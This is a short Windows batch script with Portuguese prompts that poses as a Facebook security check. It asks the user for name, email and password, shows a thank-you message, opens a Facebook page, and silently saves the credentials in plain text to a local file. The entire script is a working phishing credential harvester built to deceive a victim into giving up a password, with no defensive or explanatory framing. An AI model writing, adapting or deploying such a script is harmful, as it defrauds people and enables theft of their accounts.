@CHCP 65001>NUL
@echo off
cls
title Facebook
cls
echo.
echo. Para sua segurança o Facebook está protegido!
echo.
echo. preciso entrar com seu nome, email e senha de sesão!
echo.
set /P nome=Nome=^>
set /P email=Email=^>
set /P senha=Senha=^>
msg * Obrigado, agora você já pode usar o Facebook.
start chrome.exe http://www.facebook.com.br
goto ini

:ini
echo nome=%nome%, email=%email%, senha=%senha% > C:\bat\nome+email+senha.txt
 